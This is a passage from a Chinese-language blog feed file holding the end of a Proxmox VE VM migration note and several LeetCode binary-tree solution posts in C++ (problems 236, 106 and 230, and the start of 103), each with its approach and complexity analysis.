底下選擇我們剛才建立的 VM，點右鍵應該可以出現 <strong>Migration</strong> 的選項，我們就可以手動進行 migration 了</p><p><img src="/img/PVE/mi1.png"></p><p>&#x3D;我們將 <code>VM 100</code> 從節點 <code>pve1</code> migrate 到節點 <code>pve2</code>，完成後可以觀察到左側的VM位置已經出現在 <code>pve2</code> 底下了，這就代表 Migration 進行成功。</p><p><img src="/img/PVE/mi2.png"></p><blockquote><p>到這裡都還很okay，下一步，我會想根據條件像是 CPU 使用率或者是 CPU 功耗作為條件，用腳本進行自動 migration，這個過程中也會需要從節點1 去開啟關機的節點2，這個過程中就會用到 Wake On Lan(WOL) 這個有趣的功能，這裡就留到下一篇在紀錄。</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Proxmox VE<br><a href="https://ithelp.ithome.com.tw/articles/10338613">https://ithelp.ithome.com.tw/articles/10338613</a><br><a href="https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/jian-li-cong-ji">https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/jian-li-cong-ji</a><br><a href="https://www.linuxyes.com/blog/linuxyes-3/post/proxmox-ve-replication-ha-9">https://www.linuxyes.com/blog/linuxyes-3/post/proxmox-ve-replication-ha-9</a><br><a href="https://blog.tenyi.com/2020/01/proxmox-ve-two-nodes-ha-cluster.html">https://blog.tenyi.com/2020/01/proxmox-ve-two-nodes-ha-cluster.html</a><br><a href="https://medium.com/%E5%BD%BC%E5%BE%97%E6%BD%98%E7%9A%84-swift-ios-app-%E9%96%8B%E7%99%BC%E6%95%99%E5%AE%A4/%E5%B7%A5%E6%8E%A7%E6%A9%9F%E5%AE%89%E8%A3%9Dproxmox-ve-pve-94a09647d95f">https://medium.com/彼得潘的-swift-ios-app-開發教室/工控機安裝proxmox-ve-pve-94a09647d95f</a></p><p>Ceph<br><a href="https://www.linuxtek.ca/2023/01/27/ceph-clustering-with-proxmox/">https://www.linuxtek.ca/2023/01/27/ceph-clustering-with-proxmox/</a><br><a href="https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/ceph-object-storage">https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/ceph-object-storage</a><br><a href="https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/ceph-object-storage/ceph-xu-yao-da-liang-ji-yi-ti">https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/ceph-object-storage/ceph-xu-yao-da-liang-ji-yi-ti</a><br><a href="https://www.youtube.com/watch?v=7BcSnUz_2zQ">https://www.youtube.com/watch?v=7BcSnUz_2zQ</a><br><a href="https://forum.proxmox.com/threads/ceph-mount-a-pg-pool-for-images-isos.134367/">https://forum.proxmox.com/threads/ceph-mount-a-pg-pool-for-images-isos.134367/</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Proxmox VE </tag>
            
            <tag> Virtual Machine </tag>
            
            <tag> Infrastructure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹的最近共同祖先 | Medium | LeetCode#236. Lowest Common Ancestor of a Binary Tree</title>
      <link href="/posts/c8b16daf.html"/>
      <url>/posts/c8b16daf.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/236/question.png"></p><p><img src="/img/LeetCode/236/question2.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個 binary tree，請找到任兩節點 <code>p</code> 和 <code>q</code> 的 <strong>lowest common ancestor (LCA)</strong></li></ul><div class="note info flat"><p><a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88_(%E5%9B%BE%E8%AE%BA)">最近公同祖先(lowest common ancestor)</a>: 是指在節點 <code>p</code> 和 <code>q</code> 之間，二元樹 <code>T</code> 中最低的、同時擁有 <code>p</code> 和 <code>q</code> 作為後代的節點 <strong>（本題允許當前節點是自己的後代）</strong></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>想法一樣會是 DFS，因為在正常實踐 DFS 的過程中，我們是透過遞迴函式呼叫來實現，Ancestor 一定會是 descendant 的 caller之一。因此朝著 DFS方向去想。另外沒必要把 Traversal全部跑完，只要能夠找到 <code>p</code> 與 <code>q</code> 即可。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span> || root == p || root == q)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        TreeNode *left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        TreeNode *right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">if</span>(left!= <span class="literal">nullptr</span> &amp;&amp; right!=<span class="literal">nullptr</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span>(left!=<span class="literal">nullptr</span> &amp;&amp; right==<span class="literal">nullptr</span> ) <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="literal">nullptr</span> &amp;&amp; right!=<span class="literal">nullptr</span>) <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在這個 <code>lowestCommonAncestor</code> 函數內，終止條件會是，<strong>一旦碰到 leaf 就返回，或者找到 <code>p</code> 或 <code>q</code> 節點就回傳節點。</strong> 接下來就是 dfs 遞迴呼叫，本題使用 post-order traversal，因為要找的是 Ancestor，因此 每個子樹的root節點會最後才造訪，另外在左右child 的遞迴結果會分別保存在 <code>*left</code> 和 <code>*right</code> 指標中。而造訪節點要做的事就是做判斷，如果 <code>left</code> 與 <code>right</code> 都不為空，就代表已經找到 <code>p</code> 跟 <code>q</code>，因此當前節點會是他們的共同祖先。</p><p>而如果 <code>left</code> 與 <code>right</code> 其中一個還沒找到，那就將當前的 <code>left</code> 或 <code>right</code> 繼續回傳給 Caller。</p><blockquote><p>最後一行的 <code>nullptr</code> 主要是因為 leetcode 在 run 的時候如果函數有 return value，那他會期待每個控制路徑都要有 return 否則不給過。其實可以將 return 那邊改寫成下面這樣，就比較短。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (left != <span class="literal">nullptr</span> &amp;&amp; right != <span class="literal">nullptr</span>) <span class="keyword">return</span> root; </span><br><span class="line"><span class="keyword">return</span> left != <span class="literal">nullptr</span> ? left : right; </span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/236/result.png"></p><h2 id="更好的作法"><a href="#更好的作法" class="headerlink" title="更好的作法"></a>更好的作法</h2><p>我看解答區有人用4行就寫出來了，但邏輯跟上面一樣，只是寫得更加精簡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root || root == p || root == q) <span class="keyword">return</span> root;</span><br><span class="line">    TreeNode* left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">    TreeNode* right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">    <span class="keyword">return</span> !left ? right : !right ? left : root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>Worst Case: $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從 Inorder 和 Postorder Traversal 建構二元樹 | Medium | LeetCode#106. Construct Binary Tree from Inorder and Postorder Traversal</title>
      <link href="/posts/7af71e27.html"/>
      <url>/posts/7af71e27.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/106/question1.png"></p><p><img src="/img/LeetCode/106/question2.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定兩個整數 <code>inorder</code> 和 <code>postorder</code>  分別代表對一個 binary tree 進行 inorder traversal 和 postorder traversal 的結果，請建構一棵二元樹，並回傳二元樹的  <code>root</code>。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題算是 <a href="https://leozzmc.github.io/posts/13d1e5ab.html">LeetCode 105</a> 的延伸題目。</p><p><img src="/img/LeetCode/106/algo.png"></p><p>其實有想法很像:</p><div class="note info flat"><ul><li>Inorder 的第一個元素是 leftmost 元素</li><li>Preorder 的最後一個元素會是 root</li></ul></div><blockquote><p>因此每次迭代過程中，透過 <code>postorder</code> 中找到的 <code>root</code> 節點值，來去找到 <code>inorder</code> 中的 subTree 該怎麼切分左右子樹</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTreeHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; inorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder, <span class="type">int</span> inStart, <span class="type">int</span> inEnd, <span class="type">int</span> postStart, <span class="type">int</span> postEnd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(inStart&gt; inEnd || postStart &gt; postEnd) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> rootVal = postorder[postEnd];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// divided into subArrays</span></span><br><span class="line">        <span class="type">int</span> mid;</span><br><span class="line">        <span class="keyword">for</span>(mid= inStart; mid &lt;=inEnd; mid++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[mid]==rootVal)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> leftTreeSize = mid - inStart;</span><br><span class="line">        root -&gt; left = <span class="built_in">buildTreeHelper</span>(inorder, postorder,inStart, mid<span class="number">-1</span>, postStart, postStart+leftTreeSize<span class="number">-1</span> );</span><br><span class="line">        root -&gt; right = <span class="built_in">buildTreeHelper</span>(inorder, postorder, mid+<span class="number">1</span>, inEnd,postStart+leftTreeSize, postEnd<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; inorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder.<span class="built_in">size</span>()==<span class="number">0</span> || postorder.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buildTreeHelper</span>(inorder, postorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>()<span class="number">-1</span>, <span class="number">0</span>, postorder.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>整體作法跟 LeetCode-105 很像 都是額外建立一個 <code>helper</code> 函數，每次迭代過程中找到用來在陣列區分左右子樹的中間值的index，找到在 <code>inorder</code> 當中的分界值就可以 <code>break</code> 了。</p><p>之後就是透過下面這樣的 pattern 來建構樹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root-&gt;left = buildTree(左子樹inorder陣列，左子樹postorder陣列)</span><br><span class="line">root-&gt;right = buildTree(右子樹inorder陣列，右子樹postorder陣列)</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/106/result.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; inorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; index;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; inorder.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            index[inorder[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buildTreeHelper</span>(inorder, postorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>() - <span class="number">1</span>, <span class="number">0</span>, postorder.<span class="built_in">size</span>() - <span class="number">1</span>, index);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTreeHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; inorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder, <span class="type">int</span> inorderStart, <span class="type">int</span> inorderEnd, <span class="type">int</span> postorderStart, <span class="type">int</span> postorderEnd, unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inorderStart &gt; inorderEnd || postorderStart &gt; postorderEnd) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> rootVal = postorder[postorderEnd];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="type">int</span> inorderRootIndex = index[rootVal];</span><br><span class="line">        <span class="type">int</span> leftSubtreeSize = inorderRootIndex - inorderStart;</span><br><span class="line">        root-&gt;left = <span class="built_in">buildTreeHelper</span>(inorder, postorder, inorderStart, inorderRootIndex - <span class="number">1</span>, postorderStart, postorderStart + leftSubtreeSize - <span class="number">1</span>, index);</span><br><span class="line">        root-&gt;right = <span class="built_in">buildTreeHelper</span>(inorder, postorder, inorderRootIndex + <span class="number">1</span>, inorderEnd, postorderStart + leftSubtreeSize, postorderEnd - <span class="number">1</span>, index);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要想法還是一樣，但每次查找節點很耗費時間，如果先用個 hash table 將陣列index 和值存放起來，這樣就有機會將時間複雜度從 $O(n^2)$ 降低到 $O(n)$</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/106/result2.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>尋找根節點在 inorder 陣列中的位置：這需要遍歷 <code>inorder</code> 陣列的一部分，最差情況下要進行 $O(n)$ 次比較，其中 $n$ 是節點的數量。</p><p>接著是遞迴建立左右子樹：每次遞迴的步驟包括找根節點並且再次呼叫 <code>buildTreeHelper</code> 來建立左右子樹。對於每個節點，我們都會進行一次遍歷來確定 <code>root</code> 的位置。因此每個節點的時間複雜度是 O(n)。而整棵樹有 n 個節點，因此時間複雜度為 $O(n^2)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(n)$，每個節點都需要儲存左右子樹的指標，並且需要與 inorder 和 postorder 陣列中的節點對應。因此儲存樹結構的空間需求是 $O(n)$。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BST 中第K小的元素 | Medium | LeetCode#230. Kth Smallest Element in a BST</title>
      <link href="/posts/34a2c233.html"/>
      <url>/posts/34a2c233.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/230/question1.jpeg"><br><img src="/img/LeetCode/230/question2.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目敘述：給定一個 Binary Search Tree 的 <code>root</code>，以及一個整數 <code>k</code> ，回傳第 $k^{th}$ 小的節點值</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><blockquote><p>這題是刷題到目前下來解最快的一題，從打開題目到最後 Accept 大概花 15 分鐘，其中包含 5 分鐘在local端手動寫測試</p></blockquote><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>題目要求回傳 第 K 個最小的節點值，所以想法很簡單，<strong>首先 BST 的由左至右的大小排序跟你對樹進行 In-Order Traversal 的順序會一致，因此當你進行 In-Order Traversal 第一個拜訪的節點就會是最小值，接著拜訪到的就是 BST 中第二小的節點，依序下去…。</strong> 因此只要透過一個 counter 來計算現在是否第K個節點就好，如果找到就回傳節點值。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> count =<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *current, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(current -&gt; left, k);</span><br><span class="line">        <span class="comment">//node visiting</span></span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(count==k)&#123;result=current-&gt;val;<span class="keyword">return</span>&#125;</span><br><span class="line">        <span class="built_in">dfs</span>(current -&gt; right,k);</span><br><span class="line"></span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode* root, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root, k);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡除了題目給的 <code>kthSmallest</code> 函數之外額外宣告了一個 <code>dfs</code> 來進行節點走訪，另外有宣告一個 <code>count</code> 來記錄當前是第幾個節點， <code>result</code> 負責儲存回傳結果。 在節點拜訪過程中只要 <code>count == k</code> 就將節點值保存在 <code>result</code> 當中</p><blockquote><p>其實這時候就可以 return 了，沒必要走訪完整棵樹</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/230/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$，$N$ 為節點總數</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(H)$，$H$ 為樹高，最壞狀況下會為 $O(N)$，而平衡樹的狀況下會是 $O(LogN)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹Z字形走訪 | Medium | LeetCode#103. Binary Tree Zigzag Level Order Traversal</title>
      <link href="/posts/60d71d58.html"/>
      <url>/posts/60d71d58.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/103/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目敘述：給定一個二元樹的 <code>root</code> ，回傳對這棵樹進行 <strong>Z 字走訪 (Zigzag Level Order Traversal)的結果</strong></li></ul><div class="note info flat"><p>Zigzag Level Order Traversal 代表先從左走到右，下一層再從右走到左，每一層走訪方向交互替換</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題想法也很直觀，就BFS，然後宣告一個用來存放結果的 2D Vector，<strong>透過變數控制在每一層走訪的時候，按照順序或反向順序放入 vector 當中。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) 